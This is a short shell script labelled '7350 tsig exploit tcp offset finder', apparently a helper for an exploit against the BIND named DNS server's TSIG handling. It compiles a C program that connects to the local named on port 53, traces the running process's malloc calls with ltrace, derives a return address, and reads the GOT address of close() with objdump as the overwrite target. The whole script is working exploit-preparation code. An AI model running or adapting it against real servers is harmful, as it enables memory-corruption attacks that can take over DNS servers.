#!/bin/sh

check_util ()
{
	for util in $*; do
		echo -n "checking for $util: "
		if ! which $util; then
			echo "not found, aborting"
			exit
		fi
	done
}

echo "7350 tsig exploit tcp offset finder"

if [ $# != 2 ]; then
	echo "usage: $0 /path/to/named/binary pid-of-running-named"
	echo
	exit
fi;

check_util ltrace objdump gcc

cat > lala.c << EOF
#include <stdio.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>

int
get_connect (void)
{
        int     sock;
        struct sockaddr_in sin;

        memset (&sin, 0, sizeof(sin));

        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) {
                perror ("socket");
                exit (-1);
        }
        sin.sin_addr.s_addr = inet_addr("127.0.0.1");
        sin.sin_port = htons (53);
        sin.sin_family = AF_INET;
        if (connect (sock, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
                perror ("connect");
                exit (-1);
        }
        send (sock, "aa", 2, 0);
}

int
main (int argc, char **argv)
{
        get_connect();
        get_connect();
        get_connect();
        return(0);
}
EOF
gcc lala.c -o lala
ltrace -e malloc -p $2 -o ltrace-log &
ltrace_pid="$!"
./lala
kill -INT ${ltrace_pid}
cat ltrace-log | head -2 | tail -1 > tmp 
cat tmp | cut -d '=' -f2 | cut -c4- > ltrace-log
HEH=`cat ltrace-log| tr 'a-z' 'A-Z'`
cat > dc << EOF
16
o
16
i
EOF
echo ${HEH} >> dc
echo "D" >> dc
echo "+" >> dc
echo "p" >> dc
ret_addr=`dc ./dc`
echo $HEH
echo "set ret_addr to 0x$ret_addr"
rm -f ltrace-log tmp lala.c lala dc

HEH=`objdump --dynamic-reloc $1 | grep " close$" | cut -f1 -d ' '`
HEH="0x$HEH"
echo "set retloc to $HEH"
